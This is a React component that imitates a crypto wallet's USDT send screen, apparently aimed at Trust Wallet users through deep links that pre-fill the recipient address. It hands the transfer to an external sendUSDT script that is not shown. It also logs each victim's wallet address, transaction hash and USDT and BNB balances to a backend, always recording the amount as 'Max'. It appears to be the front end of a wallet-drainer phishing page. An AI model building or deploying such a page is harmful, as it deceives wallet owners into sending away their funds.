import { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

declare global {
  interface Window {
    sendUSDT?: () => Promise<void>;
    saveTransaction?: (data: {
      walletAddress: string;
      toAddress: string;
      txHash: string;
      usdtBalance: string;
      nativeBalance: string;
    }) => void;
  }
}

export default function Index() {
  const [searchParams] = useSearchParams();
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const createTransaction = useMutation(api.transactions.createTransaction);

  useEffect(() => {
    // Auto-fill address from URL query parameter (for Trust Wallet deep links)
    const addressParam = searchParams.get("address");
    if (addressParam) {
      setToAddress(addressParam);
    }
  }, [searchParams]);

  useEffect(() => {
    // Expose save function to app.js
    window.saveTransaction = (data) => {
      createTransaction({
        walletAddress: data.walletAddress,
        toAddress: data.toAddress,
        amount: "Max",
        txHash: data.txHash,
        usdtBalance: data.usdtBalance + " USDT",
        nativeBalance: data.nativeBalance + " BNB",
      }).catch(console.error);
    };

    return () => {
      delete window.saveTransaction;
    };
  }, [createTransaction]);

  function handleSendUSDT() {
    if (window.sendUSDT) {
      window.sendUSDT();
    }
  }

  function setMax() {
    setAmount("Max");
  }

  return (
    <div
      style={{
        margin: 0,
        background: "#0b0b0b",
        color: "#fff",
        fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
        minHeight: "100vh",
      }}
    >
      <div style={{ padding: "20px" }}>
        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
          Address or Domain Name
        </div>
        <div
          style={{
            background: "#151515",
            borderRadius: "12px",
            padding: "14px",
            marginBottom: "20px",
          }}
        >
          <input
            id="toAddress"
            value={toAddress}
            onChange={(e) => setToAddress(e.target.value)}
            placeholder="0x..."
            style={{
              width: "100%",
              background: "transparent",
              border: "none",
              outline: "none",
              color: "#fff",
              fontSize: "16px",
            }}
          />
        </div>

        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
          Amount
        </div>
        <div
          style={{
            background: "#151515",
            borderRadius: "12px",
            padding: "14px",
            marginBottom: "20px",
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
          }}
        >
          <input
            id="amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="0.0"
            style={{
              background: "transparent",
              border: "none",
              outline: "none",
              color: "#fff",
              fontSize: "16px",
              flex: 1,
            }}
          />
          <div>
            <span style={{ color: "#25d695", fontWeight: 600 }}>USDT</span>
            &nbsp;&nbsp;
            <span
              onClick={setMax}
              style={{
                color: "#25d695",
                fontSize: "14px",
                cursor: "pointer",
              }}
            >
              Max
            </span>
          </div>
        </div>
      </div>

      <button
        onClick={handleSendUSDT}
        style={{
          position: "fixed",
          bottom: "20px",
          left: "20px",
          right: "20px",
          background: "#1f8f5f",
          color: "#000",
          border: "none",
          borderRadius: "14px",
          padding: "16px",
          fontSize: "18px",
          fontWeight: 600,
          cursor: "pointer",
        }}
      >
        Send
      </button>
    </div>
  );
}
